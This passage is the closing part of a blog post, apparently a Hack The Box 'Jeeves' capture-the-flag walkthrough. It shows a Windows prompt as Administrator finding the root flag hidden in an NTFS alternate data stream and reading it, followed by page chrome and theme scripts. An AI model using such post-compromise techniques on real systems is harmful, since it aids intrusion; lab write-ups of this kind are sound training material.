10:05 AM    &lt;DIR&gt;          .</span><br><span class="line">11/08/2017  10:05 AM    &lt;DIR&gt;          ..</span><br><span class="line">12/24/2017  03:51 AM                36 hm.txt</span><br><span class="line">                                    34 hm.txt:root.txt:<span class="variable">$DATA</span></span><br><span class="line">11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk</span><br><span class="line">               2 File(s)            833 bytes</span><br><span class="line">               2 Dir(s)   7,478,935,552 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; more &lt; hm.txt:root.txt      </span><br><span class="line">afbc.....................................</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; </span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Windows/" class="print-no-link">#Windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Jeeves</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Jeeves.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>CrazyInSide</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Jewel.html" title="HTB Walkthrough - Jewel">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Jewel</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Intelligence.html" title="HTB Walkthrough - Intelligence">
+                        <span class="hidden-mobile">HTB Walkthrough - Intelligence</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
